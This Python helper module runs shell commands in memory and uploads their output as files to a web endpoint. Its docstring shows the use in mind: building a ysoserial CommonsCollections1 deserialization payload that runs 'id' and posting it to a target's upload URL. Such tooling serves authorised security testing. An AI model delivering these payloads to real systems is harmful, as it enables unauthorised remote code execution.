import subprocess
from io import BytesIO
from typing import List, Optional

import httpx

"""
Examples:
with open("evil.txt", "rb") as f:
    gzipped = generate_in_memory_output(["gzip", "-c"], input_data=f.read())
upload_bytesio_payload(gzipped, "http://target/upload", filename="evil.txt.gz")

payload = generate_in_memory_output(["java", "-jar", "ysoserial.jar", "CommonsCollections1", "id"])
upload_bytesio_payload(payload, "http://target/upload")
"""


def generate_in_memory_output(
    cmd: List[str], input_data: Optional[bytes] = None
) -> BytesIO:
    """
    Run any shell command and capture its stdout into a BytesIO stream.
    Optionally pass data to stdin (e.g., for piping).
    """
    try:
        result = subprocess.run(
            cmd,
            input=input_data,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )
        return BytesIO(result.stdout)
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Command failed: {e.stderr.decode().strip()}")


def upload_bytesio_payload(
    payload: BytesIO,
    upload_url: str,
    filename: str = "payload.bin",
    field_name: str = "file",
    headers: Optional[dict] = None,
    timeout: float = 10.0,
) -> httpx.Response:
    """
    Upload a BytesIO payload to a remote server using multipart/form-data.
    """
    payload.seek(0)
    files = {field_name: (filename, payload, "application/octet-stream")}

    try:
        response = httpx.post(upload_url, files=files, headers=headers, timeout=timeout)
        print(f"Upload status: {response.status_code}")
        return response
    except httpx.ReadTimeout:
        print("Read Timeout")
        return None
    except Exception as e:
        raise RuntimeError(f"Upload failed: {str(e)}")
